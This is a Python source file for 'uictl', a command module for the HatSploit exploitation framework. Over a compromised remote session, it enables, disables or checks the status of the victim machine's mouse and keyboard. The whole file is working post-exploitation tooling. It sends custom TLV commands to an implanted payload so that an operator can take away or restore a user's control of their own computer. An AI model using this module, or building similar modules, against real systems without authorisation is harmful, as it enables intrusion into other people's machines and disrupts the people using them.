"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny.api import *
from pwny.types import *

from badges.cmd import Command

UICTL_BASE = 10

UICTL_SET = tlv_custom_tag(API_CALL_STATIC, UICTL_BASE, API_CALL)
UICTL_GET = tlv_custom_tag(API_CALL_STATIC, UICTL_BASE, API_CALL + 1)

UICTL_DEVICE = tlv_custom_type(TLV_TYPE_INT, UICTL_BASE, API_TYPE)
UICTL_ENABLE = tlv_custom_type(TLV_TYPE_INT, UICTL_BASE, API_TYPE + 1)

UICTL_MOUSE = 0
UICTL_KEYBOARD = 1
UICTL_ALL = 2

DEVICE_MAP = {
    'mouse': UICTL_MOUSE,
    'keyboard': UICTL_KEYBOARD,
    'all': UICTL_ALL,
}


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "manage",
            'Name': "uictl",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Control user input devices (mouse/keyboard).",
            'MinArgs': 1,
            'Options': [
                (
                    ('-e', '--enable'),
                    {
                        'help': "Enable a device (mouse, keyboard, all).",
                        'metavar': 'DEVICE',
                        'choices': ['mouse', 'keyboard', 'all']
                    }
                ),
                (
                    ('-d', '--disable'),
                    {
                        'help': "Disable a device (mouse, keyboard, all).",
                        'metavar': 'DEVICE',
                        'choices': ['mouse', 'keyboard', 'all']
                    }
                ),
                (
                    ('-s', '--status'),
                    {
                        'help': "Get status for a device (mouse, keyboard).",
                        'metavar': 'DEVICE',
                        'choices': ['mouse', 'keyboard']
                    }
                )
            ]
        })

    def run(self, args):
        if args.enable:
            device = DEVICE_MAP[args.enable]

            result = self.session.send_command(
                tag=UICTL_SET,
                args={
                    UICTL_DEVICE: device,
                    UICTL_ENABLE: 1,
                }
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to enable {args.enable}!")
                return

            self.print_success(f"Successfully enabled {args.enable}.")

        elif args.disable:
            device = DEVICE_MAP[args.disable]

            result = self.session.send_command(
                tag=UICTL_SET,
                args={
                    UICTL_DEVICE: device,
                    UICTL_ENABLE: 0,
                }
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to disable {args.disable}!")
                return

            self.print_success(f"Successfully disabled {args.disable}.")

        elif args.status:
            device = DEVICE_MAP[args.status]

            result = self.session.send_command(
                tag=UICTL_GET,
                args={
                    UICTL_DEVICE: device,
                }
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to get status for {args.status}!")
                return

            enabled = result.get_int(UICTL_ENABLE)
            state = "enabled" if enabled else "disabled"

            self.print_information(f"{args.status.capitalize()}: {state}")
